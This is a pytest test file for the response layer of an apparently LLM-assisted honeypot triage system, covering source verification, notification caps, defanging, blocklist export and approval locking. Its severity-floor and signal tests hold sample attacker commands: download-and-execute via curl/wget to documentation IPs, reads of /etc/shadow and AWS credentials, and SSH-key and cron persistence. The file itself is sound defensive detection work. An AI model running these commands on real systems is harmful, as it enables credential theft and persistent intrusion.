"""Response layer: spoofed sources, never-act ranges, notification caps and content,
severity floors, blocklist formats, retention, expiry, approval locking, provenance,
outbound deadlines and per-source eviction."""

import datetime
import json
import logging
import os
import threading
import time
from pathlib import Path

import pytest
import yaml
from pydantic import ValidationError

from test_respond import NOW, FakeConnectors, pb, rec, run, write

from agents import source_state as ss
from agents.connectors import base as connector_base
from agents.connectors.base import ConnectorResult
from agents.playbooks import Playbook, load_playbooks
from agents import respond as respond_mod
from agents.respond import (
    ApprovalError,
    approve,
    build_notification,
    list_queue,
    matching_detections,
    reject,
    write_blocklist,
)

pytestmark = pytest.mark.usefixtures("public_test_net")


def defang(text):
    return connector_base.defang(text)


def unblock(*args, **kwargs):
    return respond_mod.unblock(*args, **kwargs)

H = datetime.timedelta(hours=1)


class CappedConnectors(FakeConnectors):
    def __init__(self, cap=200, **kw):
        super().__init__(**kw)
        self.cap = cap

    def daily_cap(self, name):
        return self.cap


def _shipped():
    return {p.name: p for p in load_playbooks()[0]}


def _notify_pb(name="np_pb", priority=False, **kw):
    return pb(name=name, priority=priority,
              steps=[{"action": "notify", "connectors": ["webhook"]}], **kw)


def _notes(conn):
    return [c[2] for c in conn.calls if c[0] == "notify"]


# ---- spoofed sources -----------------------------------------------------------------------

def test_unverified_source_gets_no_action_of_any_tier_and_no_notification(tmp_path):
    r = rec(unverified=True, protocol="sip", signals={"sip_dialed_number": 3},
            dialed=[("0044207946000", 2)])
    write(tmp_path / "reports", r)
    conn = FakeConnectors()
    out = run(tmp_path, [_shipped()["toll_fraud"]], conn, queue_enforce=True)
    [r_out] = out["runs"]
    assert r_out["trigger"]["source_verified"] is False
    assert all(s["status"] == "refused: unverified source" for s in r_out["steps"])
    assert conn.calls == []
    assert not (tmp_path / "source_state.json").exists()
    assert list_queue(tmp_path / "state", now=NOW) == []


def test_notifications_and_siem_events_carry_source_verified(tmp_path):
    from agents.connectors.siem_http import build_event
    from agents.connectors.webhook import build_payload

    write(tmp_path / "reports", rec())
    conn = FakeConnectors()
    run(tmp_path, [_notify_pb()], conn)
    [n] = _notes(conn)
    assert n.source_verified is True
    assert build_event(n)["event"]["source_verified"] is True
    assert build_payload(n)["event"]["source_verified"] is True


def test_priority_is_a_validated_playbook_field_set_on_three_shipped_playbooks():
    with pytest.raises(ValidationError):
        Playbook.model_validate({"name": "p_pb", "priority": "yes", "when": {},
                                 "steps": [{"action": "shallow"}]})
    prio = {n for n, p in _shipped().items() if p.priority}
    assert prio == {"honeytoken_reuse", "sensitive_data_access", "database_takeover"}


def test_notify_cap_reserves_a_share_for_priority_playbooks(tmp_path):
    flood = [rec(rid=f"f{i}", ip=f"198.51.100.{i + 1}") for i in range(10)]
    write(tmp_path / "reports", *flood)
    conn = CappedConnectors(cap=8)
    run(tmp_path, [_notify_pb(max_runs_per_day=1000)], conn, notify_reserved_share=0.25,
        notify_max_per_playbook=100, suppressed_notice_minutes=600)
    regular = [n for n in _notes(conn) if n.playbook == "np_pb"]
    assert len(regular) == 6                                       # 8 minus the reserved 2
    write(tmp_path / "reports", rec(rid="tok", ip="198.51.100.99", honeytokens=["aws_key"]))
    run(tmp_path, [_notify_pb(name="prio_pb", priority=True)], conn,
        notify_reserved_share=0.25, now=NOW + datetime.timedelta(minutes=5))
    assert [n.record_id for n in _notes(conn) if n.playbook == "prio_pb"] == ["tok"]


def test_notify_cap_per_playbook_and_suppressed_notice_once_per_period(tmp_path):
    write(tmp_path / "reports", *[rec(rid=f"a{i}", ip=f"198.51.100.{i + 1}") for i in range(4)])
    conn = CappedConnectors(cap=100)
    opts = dict(notify_max_per_playbook=2, suppressed_notice_minutes=60)
    out = run(tmp_path, [_notify_pb(max_runs_per_day=1000)], conn, **opts)
    sent = [n for n in _notes(conn) if n.playbook == "np_pb"]
    notices = [n for n in _notes(conn) if n.playbook == "notify_suppressed"]
    assert len(sent) == 2 and len(notices) == 1
    assert "2 notifications suppressed" in notices[0].title
    statuses = [c["status"] for r in out["runs"] for c in r["steps"][0]["connectors"]]
    assert statuses.count("suppressed: playbook cap") == 2
    assert out["suppressed_notices"][0]["count"] == 2

    write(tmp_path / "reports", *[rec(rid=f"b{i}", ip=f"198.51.100.{i + 20}") for i in range(3)])
    run(tmp_path, [_notify_pb(max_runs_per_day=1000)], conn, now=NOW + 10 * datetime.timedelta(minutes=1), **opts)
    assert len([n for n in _notes(conn) if n.playbook == "notify_suppressed"]) == 1

    write(tmp_path / "reports", rec(rid="c0", ip="198.51.100.50"))
    run(tmp_path, [_notify_pb(max_runs_per_day=1000)], conn, now=NOW + 2 * H, **opts)
    notices = [n for n in _notes(conn) if n.playbook == "notify_suppressed"]
    assert len(notices) == 2 and "4 notifications suppressed" in notices[1].title


def test_connector_cap_reached_counts_as_suppressed(tmp_path):
    class Full(CappedConnectors):
        def notify(self, name, n):
            self.calls.append(("notify", name, n))
            return ConnectorResult(False, "cap_reached")

    write(tmp_path / "reports", rec())
    out = run(tmp_path, [_notify_pb()], Full())
    assert out["suppressed_pending"] == {"webhook": 1}


# ---- never act on non-global or listed ranges ----------------------------------------------

@pytest.mark.parametrize("ip", ["127.0.0.1", "10.1.2.3", "192.168.1.5", "172.16.0.9",
                                "169.254.1.1", "100.64.0.5", "224.0.0.1", "240.0.0.1",
                                "0.0.0.0", "::1", "fe80::1", "fc00::1", "ff02::1"])
def test_non_global_sources_get_no_action_of_any_tier(tmp_path, ip):
    write(tmp_path / "reports", rec(ip=ip))
    conn = FakeConnectors()
    p = pb(steps=[{"action": "tag_source", "tag": "x_tag"}, {"action": "enrich"},
                  {"action": "notify", "connectors": ["webhook"]}, {"action": "export_blocklist"}])
    out = run(tmp_path, [p], conn, queue_enforce=True)
    assert all(s["status"] == "refused: non-global source" for s in out["runs"][0]["steps"])
    assert conn.calls == [] and not (tmp_path / "source_state.json").exists()


def test_never_act_on_list_checked_for_every_tier(tmp_path):
    write(tmp_path / "reports", rec(ip="198.51.100.34"), rec(rid="v6", ip="2001:db8:5:6::9"),
          rec(rid="ok", ip="198.51.100.151"))
    conn = FakeConnectors()
    p = pb(steps=[{"action": "tag_source", "tag": "x_tag"}, {"action": "notify", "connectors": ["webhook"]},
                  {"action": "export_blocklist"}])
    out = run(tmp_path, [p], conn, queue_enforce=True,
              never_act_on=["198.51.100.0/25", "2001:db8:5::/48"])
    by_id = {r["trigger"]["record_id"]: [s["status"] for s in r["steps"]] for r in out["runs"]}
    assert by_id["r1"] == ["refused: never_act_on"] * 3
    # 2001:db8::/32 is documentation space (non-global), so either refusal is correct here.
    assert all(s.startswith("refused") for s in by_id["v6"])
    assert by_id["ok"][0] == "applied"
    assert [c[2].record_id for c in conn.calls if c[0] == "notify"] == ["ok"]


def test_never_act_on_rejects_bad_cidr():
    from agents.respond import RespondSettings

    with pytest.raises(ValueError):
        RespondSettings(never_act_on=("not-a-net",)).networks()


def test_one_private_address_behind_a_proxy_stops_per_source_actions(tmp_path, caplog):
    records = [rec(rid=f"p{i}", ip="10.0.0.1") for i in range(12)]
    records += [rec(rid=f"g{i}", ip=f"198.51.100.{i + 1}") for i in range(8)]
    write(tmp_path / "reports", *records)
    with caplog.at_level(logging.WARNING, logger="agents.respond"):
        out = run(tmp_path, [pb(max_runs_per_day=1000)])
    assert out["proxy_suspected"]["address"] == "10.0.0.1"
    assert any("proxy" in m for m in caplog.messages)
    statuses = {r["trigger"]["record_id"]: r["steps"][0]["status"] for r in out["runs"]}
    assert statuses["g0"] == "refused: proxy suspected"
    assert not (tmp_path / "source_state.json").exists()


def test_proxy_guard_needs_enough_records(tmp_path):
    records = [rec(rid=f"p{i}", ip="10.0.0.1") for i in range(10)]
    records += [rec(rid=f"g{i}", ip=f"198.51.100.{i + 1}") for i in range(9)]
    write(tmp_path / "reports", *records)
    out = run(tmp_path, [pb(max_runs_per_day=1000)])
    assert out["proxy_suspected"] is None
    assert ss.load(tmp_path / "source_state.json").entries["198.51.100.1"].tags == ["x_tag"]


# ---- notification content ------------------------------------------------------------------

NARRATIVE = "@channel <b>urgent</b> visit http://evil.example.com/x and 203.0.113.66 [click](x)"


def test_notification_built_from_structured_fields_without_narrative(tmp_path):
    r = rec(narrative=NARRATIVE, iocs=[("url", "http://evil.example.com/drop.sh")])
    n = build_notification(pb(), r, ["urls"], [], include_narrative=False)
    blob = n.model_dump_json()
    assert "@channel" not in blob and "urgent" not in blob
    assert "test_pb" in n.summary and "redis_takeover" in n.summary
    assert n.details["urls"] == ["http://evil.example.com/drop.sh"]       # raw for the SIEM


def test_included_narrative_is_labelled_untrusted_and_stripped(tmp_path):
    n = build_notification(pb(), rec(narrative=NARRATIVE), [], [], include_narrative=True)
    assert "untrusted" in n.summary.lower()
    tail = n.summary.split(":", 1)[1]
    for ch in "@<>[]*_`|":
        assert ch not in n.summary.split("untrusted", 1)[1], ch
    assert tail


def test_chat_email_and_ticket_outputs_are_defanged_siem_keeps_raw():
    from agents.connectors.email import build_body
    from agents.connectors.siem_http import build_event
    from agents.connectors.ticket import build_ticket
    from agents.connectors.webhook import build_payload

    n = build_notification(pb(), rec(ip="198.51.100.34", narrative=NARRATIVE,
                                     iocs=[("url", "https://evil.example.com/drop.sh")],
                                     users=[("admin@corp.example", 2)]),
                           ["urls", "credentials"], [], include_narrative=True)
    chat = json.dumps(build_payload(n))
    mail = build_body(n)
    for out in (chat, mail):
        assert "evil.example.com" not in out and "198.51.100.34" not in out
        assert "hxxps://evil[.]example[.]com" in out and "198[.]51[.]100[.]34" in out
        assert "@" not in out
    siem = build_event(n)["event"]
    assert siem["details"]["urls"] == ["https://evil.example.com/drop.sh"]
    assert siem["source"] == "198.51.100.34"
    ticket = build_ticket({"title": "x: 198.51.100.34", "summary": "see http://a.example/b",
                           "source": "198.51.100.34", "record_id": "r", "priority": "high"})
    assert ticket["source"] == "198[.]51[.]100[.]34" and "hxxp://a[.]example/b" in ticket["summary"]


def test_defang_handles_urls_domains_ips():
    assert defang("http://a.b.example/x") == "hxxp://a[.]b[.]example/x"
    assert defang("ftp://203.0.113.4/") == "fxp://203[.]0[.]113[.]4/"
    assert defang("mail me@x.example") == "mail me[at]x[.]example"


def test_approval_summary_excludes_narrative(tmp_path):
    write(tmp_path / "reports", rec(narrative=NARRATIVE))
    run(tmp_path, [pb(steps=[{"action": "export_blocklist"}])], queue_enforce=True)
    [a] = list_queue(tmp_path / "state", now=NOW)
    assert "@channel" not in a["summary"] and "evil" not in a["summary"]
    assert "test_pb" in a["summary"]


# ---- severity floor for SSH sessions --------------------------------------------------------

@pytest.mark.parametrize("commands,signal", [
    (["wget http://198.51.100.9/x.sh -O /tmp/x.sh", "chmod +x /tmp/x.sh", "/tmp/x.sh"],
     "download_execute"),
    (["curl -s http://198.51.100.9/i | sh"], "download_execute"),
    (["cat /etc/shadow"], "credential_file_read"),
    (["cat ~/.aws/credentials"], "credential_file_read"),
    (["echo ssh-rsa AAAA >> ~/.ssh/authorized_keys"], "persistence"),
    (["(crontab -l; echo '* * * * * /tmp/x') | crontab -"], "persistence"),
    (["systemctl enable evil.service"], "persistence"),
])
def test_session_signals_set_a_floor_the_model_cannot_lower(commands, signal):
    from agent_fakes import FakeJsonLLM, GOOD_TRIAGE

    from agents.sessions import Session, Turn
    from agents.triage import triage_session

    s = Session(session_id="s1", src_ip="198.51.100.34",
                turns=[Turn(None, "input", c) for c in commands])
    benign = dict(GOOD_TRIAGE, judgement="BENIGN", stage="NONE", narrative="Nothing to see.")
    r = triage_session(s, FakeJsonLLM(benign), {})
    assert r.high_signal.get(signal) and r.judgement.value == "MALICIOUS"
    # Unusable model output still yields a deterministic record when signals are present.
    r2 = triage_session(s, FakeJsonLLM("not json"), {})
    assert r2 is not None and r2.judgement.value == "MALICIOUS" and r2.high_signal.get(signal)


def test_benign_session_without_signals_keeps_model_judgement():
    from agent_fakes import FakeJsonLLM, GOOD_TRIAGE

    from agents.sessions import Session, Turn
    from agents.triage import triage_session

    s = Session(session_id="s2", src_ip="198.51.100.34", turns=[Turn(None, "input", "ls -la")])
    r = triage_session(s, FakeJsonLLM(dict(GOOD_TRIAGE, judgement="BENIGN")), {})
    assert r.judgement.value == "BENIGN" and r.high_signal == {}
    assert triage_session(s, FakeJsonLLM("not json"), {}) is None


def test_shipped_playbooks_do_not_depend_on_model_judgement(tmp_path):
    for p in _shipped().values():
        w = p.when
        assert w.judgement_at_least is None and not w.intents and not w.stages, p.name
    r = rec(kind="session", protocol="ssh", judgement="BENIGN", signals={"download_execute": 1})
    write(tmp_path / "reports", r)
    out = run(tmp_path, [_shipped()["malware_drop"]])
    assert [x["playbook"] for x in out["runs"]] == ["malware_drop"]


# ---- blocklist formats ---------------------------------------------------------------------

def test_nftables_export_has_separate_v4_v6_interval_sets(tmp_path):
    path = tmp_path / "bl.nft"
    write_blocklist(path, {"198.51.100.34": NOW.isoformat(), "2001:db8:1:2::/64": NOW.isoformat()},
                    "nftables")
    text = path.read_text()
    assert text.count("{") == text.count("}")
    assert "table inet winnie" in text
    assert "type ipv4_addr" in text and "type ipv6_addr" in text
    assert text.count("flags interval") == 2
    v4 = next(line for line in text.splitlines() if line.startswith("add element") and "_v4" in line)
    v6 = next(line for line in text.splitlines() if line.startswith("add element") and "_v6" in line)
    assert "198.51.100.34" in v4 and "2001:db8:1:2::/64" in v6
    # No element line for an empty family (an empty element list is a syntax error).
    write_blocklist(path, {"198.51.100.34": NOW.isoformat()}, "nftables")
    assert not any("_v6 {" in line and line.startswith("add element")
                   for line in path.read_text().splitlines())


def test_block_webhook_accepts_ipv6_network(tmp_path):
    write(tmp_path / "reports", rec(ip="2001:4860:1:2::7"))
    conn = FakeConnectors()
    run(tmp_path, [pb(steps=[{"action": "block_webhook"}])], conn, queue_enforce=True)
    [a] = list_queue(tmp_path / "state", now=NOW)
    done = approve(a["id"], tmp_path / "state", tmp_path / "reports", tmp_path / "det",
                   connectors=conn, by="o", now=NOW)
    assert done["status"] == "done" and conn.calls == [("block", "2001:4860:1:2::/64", "test_pb")]


# ---- retention -----------------------------------------------------------------------------

def test_source_state_snapshots_pruned_keep_last_n_and_recent(tmp_path):
    path, sd = tmp_path / "s.json", tmp_path / "st"
    for i in range(6):
        def mutate(state, i=i):
            e = ss.new_entry(f"198.51.100.{i + 1}", NOW, 24)
            state.entries[e.key] = e
            return state
        ss.update(path, sd, mutate, NOW, keep_snapshots=3, keep_days=7)
    assert len(list((sd / "source-state-snapshots").glob("*.json"))) == 6   # all recent
    old = time.time() - 30 * 86400
    for p in (sd / "source-state-snapshots").glob("*.json"):
        os.utime(p, (old, old))

    def one_more(state):
        e = ss.new_entry("198.51.100.99", NOW, 24)
        state.entries[e.key] = e
        return state

    _, n = ss.update(path, sd, one_more, NOW, keep_snapshots=3, keep_days=7)
    names = sorted(p.stem for p in (sd / "source-state-snapshots").glob("*.json"))
    assert n == 7 and names == ["000005", "000006", "000007"]


def test_old_approvals_and_response_records_are_aged_out(tmp_path):
    write(tmp_path / "reports", rec())
    run(tmp_path, [pb(steps=[{"action": "export_blocklist"}])], queue_enforce=True)
    [a] = list_queue(tmp_path / "state", now=NOW)
    reject(a["id"], tmp_path / "state", by="o", now=NOW)
    later = NOW + datetime.timedelta(days=40)
    write(tmp_path / "reports", rec(rid="r2", ip="198.51.100.99", ))
    out = run(tmp_path, [pb(name="later_pb")], now=later, lookback_hours=24 * 60)
    assert not (tmp_path / "state" / "approvals" / f"{a['id']}.json").exists()
    old = [p for p in (tmp_path / "reports" / "response").glob("*.json")
           if p.name.startswith(NOW.strftime("%Y%m%d"))]
    assert old == []
    assert out["retention"]["approvals_removed"] == 1


def test_enqueue_uses_pending_index_not_every_file(tmp_path, monkeypatch):
    from agents import respond

    write(tmp_path / "reports", *[rec(rid=f"q{i}", ip=f"198.51.100.{i + 1}") for i in range(30)])
    run(tmp_path, [pb(steps=[{"action": "export_blocklist"}], max_runs_per_day=1000)],
        queue_enforce=True)
    assert len(list_queue(tmp_path / "state", now=NOW)) == 30
    reads = []
    real = respond._read_json

    def counting(path, default):
        if "approvals" in str(path) and path.name.startswith("a-"):
            reads.append(path.name)
        return real(path, default)

    monkeypatch.setattr(respond, "_read_json", counting)
    write(tmp_path / "reports", rec(rid="dup", ip="198.51.100.1"),
          rec(rid="new", ip="198.51.100.200"))
    out = run(tmp_path, [pb(name="again_pb", steps=[{"action": "export_blocklist"}])],
              queue_enforce=True, now=NOW + H)
    statuses = {r["trigger"]["record_id"]: r["steps"][0]["status"] for r in out["runs"]}
    assert statuses["dup"].startswith("already queued")
    assert statuses["new"].startswith("queued for approval")
    assert len(reads) <= 1                     # at most the one indexed duplicate


def test_size_alarm_event(tmp_path, caplog):
    write(tmp_path / "reports", rec())
    (tmp_path / "state" / "approvals").mkdir(parents=True)
    (tmp_path / "state" / "approvals" / "pad.bin").write_bytes(b"x" * 4096)
    with caplog.at_level(logging.WARNING, logger="agents.respond"):
        out = run(tmp_path, [pb()], size_alarm_mb=0.001)
    assert out["size_alarm"] and out["size_alarm"]["bytes"] >= 4096
    assert any("size" in m for m in caplog.messages)


# ---- blocklist expiry, unblock, suppression after reject or expiry -------------------------

def _queue_block(tmp_path, ip="198.51.100.34", rid="r1", now=NOW, name="test_pb"):
    write(tmp_path / "reports", rec(rid=rid, ip=ip))
    return run(tmp_path, [pb(name=name, steps=[{"action": "export_blocklist"}])],
               queue_enforce=True, now=now, lookback_hours=24 * 30)


def test_blocklist_entries_expire(tmp_path):
    _queue_block(tmp_path)
    [a] = list_queue(tmp_path / "state", now=NOW)
    target = tmp_path / "bl.txt"
    approve(a["id"], tmp_path / "state", tmp_path / "reports", tmp_path / "det", by="o", now=NOW,
            blocklist_file=target, blocklist_ttl_days=30)
    store = json.loads((tmp_path / "state" / "approved_blocklist.json").read_text())
    assert store["198.51.100.34"]["expires_at"].startswith("2026-12-15")
    assert "198.51.100.34" in target.read_text()
    run(tmp_path, [pb(name="noop_pb")], now=NOW + datetime.timedelta(days=31),
        blocklist_file=target)
    assert "198.51.100.34" not in target.read_text()


def test_unblock_removes_address_and_network(tmp_path):
    target = tmp_path / "bl.txt"
    for i, ip in enumerate(["198.51.100.34", "2001:4860:1:2::7"]):
        _queue_block(tmp_path, ip=ip, rid=f"u{i}", name=f"u{i}_pb")
    for a in list_queue(tmp_path / "state", now=NOW):
        approve(a["id"], tmp_path / "state", tmp_path / "reports", tmp_path / "det", by="o",
                now=NOW, blocklist_file=target)
    out = unblock("198.51.100.34", tmp_path / "state", tmp_path / "reports", blocklist_file=target)
    assert out["removed"] == ["198.51.100.34"]
    out = unblock("2001:4860:1:2::99", tmp_path / "state", tmp_path / "reports", blocklist_file=target)
    assert out["removed"] == ["2001:4860:1:2::/64"]
    assert target.read_text().strip() == ""
    with pytest.raises(ValueError):
        unblock("not-an-ip", tmp_path / "state", tmp_path / "reports")


def test_cli_unblock(tmp_path, monkeypatch):
    import agents.__main__ as cli

    target = tmp_path / "bl.txt"
    _queue_block(tmp_path)
    [a] = list_queue(tmp_path / "state", now=NOW)
    approve(a["id"], tmp_path / "state", tmp_path / "reports", tmp_path / "det", by="o",
            now=NOW, blocklist_file=target)
    cfg = tmp_path / "config.ini"
    cfg.write_text(f"[respond]\nblocklist_file = {target}\n")
    out = cli.run(["unblock", "198.51.100.34", "--config", str(cfg), "--reports-dir",
                   str(tmp_path / "reports"), "--state-dir", str(tmp_path / "state")])
    assert out["unblock"]["removed"] == ["198.51.100.34"]
    assert "198.51.100.34" not in target.read_text()


def test_rejection_suppresses_requeue_for_a_period(tmp_path):
    _queue_block(tmp_path)
    [a] = list_queue(tmp_path / "state", now=NOW)
    reject(a["id"], tmp_path / "state", by="o", now=NOW, suppress_hours=24)
    out = _queue_block(tmp_path, rid="r2", now=NOW + 2 * H)
    assert out["runs"][0]["steps"][0]["status"] == "suppressed: rejected"
    assert list_queue(tmp_path / "state", now=NOW + 2 * H) == []
    out = _queue_block(tmp_path, rid="r3", now=NOW + 25 * H)
    assert out["runs"][0]["steps"][0]["status"].startswith("queued for approval")


def test_expired_approval_does_not_requeue_immediately(tmp_path):
    _queue_block(tmp_path)
    out = _queue_block(tmp_path, rid="r2", now=NOW + 73 * H)
    assert out["runs"][0]["steps"][0]["status"] == "suppressed: expired"
    out = _queue_block(tmp_path, rid="r3", now=NOW + 98 * H)
    assert out["runs"][0]["steps"][0]["status"].startswith("queued for approval")


# ---- per-effect expiry and mode precedence -------------------------------------------------

def test_each_effect_has_its_own_expiry(tmp_path):
    real_now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
    # This test runs against the wall clock (the view expires entries by real time), so the
    # record is stamped near it too; the fixed NOW would fall out of the lookback window.
    seen = (real_now - 3 * H).isoformat()
    write(tmp_path / "reports",
          rec(ip="198.51.100.60").model_copy(update={"first_seen": seen, "last_seen": seen}))
    p = pb(steps=[{"action": "tag_source", "tag": "long_tag", "hours": 168},
                  {"action": "tarpit", "delay_ms": 900, "hours": 1},
                  {"action": "deepen", "hours": 1},
                  {"action": "capture_more", "hours": 72}])
    run(tmp_path, [p], now=real_now - 2 * H)
    view = ss.SourceStateView(tmp_path / "source_state.json", check_every=0)
    e = view.get("198.51.100.60")
    assert e is not None and e.tags == ["long_tag"] and e.capture_more
    assert e.tarpit_ms == 0 and e.budget_mode == "normal"


def test_shallow_overrides_deep_for_later_noise(tmp_path):
    write(tmp_path / "reports", rec(ip="198.51.100.61"))
    run(tmp_path, [pb(name="deep_pb", steps=[{"action": "deepen", "hours": 48}])])
    write(tmp_path / "reports", rec(rid="r2", ip="198.51.100.61"))
    run(tmp_path, [pb(name="shallow_pb", steps=[{"action": "shallow", "hours": 48}])], now=NOW + H)
    assert ss.load(tmp_path / "source_state.json").entries["198.51.100.61"].budget_mode == "shallow"


# ---- approval locking ----------------------------------------------------------------------

def test_concurrent_approvals_execute_once(tmp_path):
    class Slow(FakeConnectors):
        def block(self, ip, reason):
            time.sleep(0.3)
            return super().block(ip, reason)

    write(tmp_path / "reports", rec())
    conn = Slow()
    run(tmp_path, [pb(steps=[{"action": "block_webhook"}])], conn, queue_enforce=True)
    [a] = list_queue(tmp_path / "state", now=NOW)
    results, errors = [], []

    def go():
        try:
            results.append(approve(a["id"], tmp_path / "state", tmp_path / "reports",
                                   tmp_path / "det", connectors=conn, by="o", now=NOW))
        except ApprovalError as exc:
            errors.append(str(exc))

    threads = [threading.Thread(target=go) for _ in range(4)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert len(results) == 1 and len(errors) == 3
    assert [c for c in conn.calls if c[0] == "block"] == [("block", "198.51.100.34", "test_pb")]


# ---- detection provenance ------------------------------------------------------------------

def _draft(det: Path, name: str, values: list[str], related: list[str]):
    (det / "pending").mkdir(parents=True, exist_ok=True)
    rule = {"title": "t", "detection": {"selection": {"CommandLine|contains": values},
                                         "condition": "selection"},
            "related_records": related}
    (det / "pending" / name).write_text(yaml.safe_dump(rule))


def test_publish_detection_selects_by_recorded_provenance_only(tmp_path):
    r = rec(rid="mine", iocs=[("url", "http://198.51.100.9/bins/mirai.x86")])
    det = tmp_path / "det"
    _draft(det, "aaaaaaaa-overlap.yml", ["http://198.51.100.9/bins/mirai.x86"], ["someone-else"])
    _draft(det, "bbbbbbbb-mine.yml", ["unrelated-value"], ["mine"])
    _draft(det, "cccccccc-unrelated.yml", ["http://198.51.100.9/bins/mirai.x86"], [])
    assert matching_detections(r, det) == ["bbbbbbbb-mine.yml"]


def test_detect_drafts_record_their_provenance(tmp_path):
    from agents.detect import run_detect

    url = "http://198.51.100.9/bins/mirai.x86"
    write(tmp_path / "reports",
          rec(rid="d1", ip="198.51.100.1", kind="session", iocs=[("url", url)]),
          rec(rid="d2", ip="198.51.100.2", kind="session", iocs=[("url", url)]))
    run_detect(tmp_path / "reports", tmp_path / "det")
    rules = [yaml.safe_load(p.read_text()) for p in (tmp_path / "det" / "pending").glob("*.yml")]
    ioc_rule = next(r for r in rules if url in json.dumps(r["detection"]))
    assert sorted(ioc_rule["related_records"]) == ["d1", "d2"]
    signal_rule = next(r for r in rules if r["title"] == "Redis takeover command chain")
    assert sorted(signal_rule["related_records"]) == ["d1", "d2"]


# ---- outbound deadline ---------------------------------------------------------------------

def test_transport_enforces_one_overall_deadline():
    from agents.connectors.http import UrlTransport

    clock = [0.0]

    class Drip:
        status = 200

        def read(self, amt=None):
            clock[0] += 1.0                     # each byte arrives just inside the socket timeout
            return b"x"

    class Conn:
        def request(self, *a, **kw):
            pass

        def getresponse(self):
            return Drip()

        def close(self):
            pass

    t = UrlTransport(connection_factory=lambda *a: Conn(), context_factory=lambda: None,
                     clock=lambda: clock[0])
    with pytest.raises(TimeoutError):
        t.request("POST", "https://hooks.example.com/x", {}, b"{}", 5.0, "198.51.100.34")
    assert clock[0] <= 7


# ---- per-source eviction -------------------------------------------------------------------

def test_eviction_drops_plain_tags_before_planted_tokens(tmp_path, monkeypatch):
    monkeypatch.setattr(ss, "MAX_ENTRIES", 3)
    real_now = datetime.datetime.now(datetime.timezone.utc)

    def mutate(state):
        tok = ss.new_entry("198.51.100.1", real_now, 1).model_copy(update={"plant_token": True})
        cap = ss.new_entry("198.51.100.2", real_now, 2).model_copy(update={"capture_more": True})
        state.entries[tok.key], state.entries[cap.key] = tok, cap
        for i in range(3, 6):
            e = ss.new_entry(f"198.51.100.{i}", real_now, 100 + i).model_copy(
                update={"tags": ["plain"], "tarpit_ms": 100})
            state.entries[e.key] = e
        return ss.SourceState.model_construct(entries=state.entries)

    new, _ = ss.update(tmp_path / "s.json", tmp_path / "st", mutate, real_now)
    assert set(new.entries) == {"198.51.100.1", "198.51.100.2", "198.51.100.5"}


def test_download_without_execution_is_not_download_execute():
    from agents.triage import session_signals

    assert session_signals(["wget http://198.51.100.9/x -O /tmp/x", "ls ./"]) == {}
    assert session_signals(["cat ~/.ssh/authorized_keys", "crontab -l"]) == {}
    assert session_signals(["cd /tmp; ./x"]) == {}
    assert session_signals(["wget http://198.51.100.9/x -O /tmp/x", "cd /tmp; ./x"]) == {
        "download_execute": 1}


def test_settings_from_config_parse_and_validate():
    from configparser import ConfigParser

    from agents.respond import RespondSettings

    cp = ConfigParser()
    cp.read_string("[respond]\nnever_act_on = 198.51.100.0/24, 2001:db8:10::/48\n"
                   "include_narrative = true\nretention_days = 7.5\nnotify_max_per_playbook = 9\n")
    s = RespondSettings.from_config(cp["respond"])
    assert s.never_act_on == ("198.51.100.0/24", "2001:db8:10::/48")
    assert s.include_narrative is True and s.retention_days == 7.5
    assert s.notify_max_per_playbook == 9 and s.approval_ttl_hours == 72
    for bad in ("never_act_on = nope", "notify_reserved_share = 1.5", "snapshot_keep = many"):
        cp = ConfigParser()
        cp.read_string(f"[respond]\n{bad}\n")
        with pytest.raises(ValueError):
            RespondSettings.from_config(cp["respond"])


def test_approve_rechecks_never_act_on_and_unindexed_queue_is_indexed(tmp_path):
    _queue_block(tmp_path)
    (tmp_path / "state" / "approvals" / "index.json").unlink()     # queue from before the index
    out = _queue_block(tmp_path, rid="r2", name="test_pb", now=NOW + 2 * H)
    assert out["runs"][0]["steps"][0]["status"].startswith("already queued")
    [a] = list_queue(tmp_path / "state", now=NOW + 2 * H)
    done = approve(a["id"], tmp_path / "state", tmp_path / "reports", tmp_path / "det", by="o",
                   now=NOW + 2 * H, never_act_on=("198.51.100.0/24",))
    assert done["status"] == "failed" and done["result"]["status"] == "refused: never_act_on"
